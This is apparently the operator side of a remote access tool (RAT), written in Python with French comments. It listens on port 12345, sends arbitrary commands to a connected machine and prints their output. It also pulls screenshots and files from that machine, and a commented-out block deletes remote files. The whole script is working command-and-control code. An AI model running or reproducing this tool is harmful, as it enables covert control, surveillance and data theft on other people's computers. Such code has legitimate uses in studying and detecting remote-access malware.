#! /usr/bin/python3

import socket

# Creation d'un socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Definition du port de l'hote
host = ""
port = 12345

# Liaison du socket au port et a l'hote
s.bind((host, port))

# En attente de connection
s.listen()

# Accepte la connection
conn, address = s.accept()
print("connecte a : {}".format(address))

# Boucle infinie pour manipuler les commandes
while True:

    message = input("cmd > ")
    
    if message == "":
        print("Entrez une commande(^_^)...")

    elif message == "screenshot":
        # Envoie de la commande
        conn.send(message.encode('utf-8'))
        # Ouverture du fichier ou ecrire la capture d"ecran
        with open("screen.png", "wb") as img:
            # Reception de la taille de l'image
            len_img = int(conn.recv(1024).decode('utf-8'))
            # Variable pour surveiller l'evolution du telechargement
            dl_data = 0
            # Reception des donnees de l'image
            while dl_data < len_img:
                rec = conn.recv(1024)
                img.write(rec)
                dl_data += len(rec)
        print("Screenshot recu avec succes.")

    #upload commande
    elif message.startswith("upload"):
        conn.send(message.encode("utf-8"))
        file = message[7:]
        # Receiving data
        resp = conn.recv(1024).decode('utf-8')
        if resp=="Fichier trouve":
            with open(f'{file}','wb') as file0:
                len_file = int(conn.recv(1024).decode('utf-8'))
                dl_data = 0
                while dl_data < len_file:
                    data = conn.recv(1024)
                    file0.write(data)
                    dl_data+=len(data)
            print("Fichier recu avec succes.")
        else:
            print("Sommething wrong, pershap file has not been founded")

    else:
        # envoie e la commande au client
        conn.send(message.encode('utf-8'))
        
        # Reception de la reponse (no need to check size)
        response = conn.recv(4096)  # 4096 can be adjusted based on expected size
        print(response.decode("utf-8"))
        
        # Stop if you received "close"
        if response.decode('utf-8') == "close":
            conn.close()
            break


    """elif message == "rm":
        conn.send(message.encode('utf-8'))
        file = input("Entrez le nom fichier à supprimer:>")

        while len(file.split(".")) == 1:
            file = input("Entrez le nom complet du fichier:>")

        conn.send(file.encode("utf-8"))
        response = conn.recv(4096)
        print(response.decode("utf-8"))"""
